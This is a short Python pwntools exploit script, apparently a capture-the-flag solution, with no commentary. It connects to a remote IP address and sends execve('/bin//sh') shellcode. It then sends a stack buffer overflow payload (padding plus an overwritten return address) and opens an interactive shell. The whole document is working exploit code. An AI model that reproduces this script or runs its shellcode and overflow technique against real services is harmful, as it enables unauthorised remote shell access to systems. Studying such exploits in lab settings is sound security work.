from pwn import *

io=remote("35.221.144.41",10000)
shellcode="\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"
print len(shellcode)
io.recvline()
io.recvline()
io.sendline(shellcode)
print io.recvline()
payload='a'*0x28+p64(0x404070)
io.recvline()
io.sendline(payload)
io.interactive()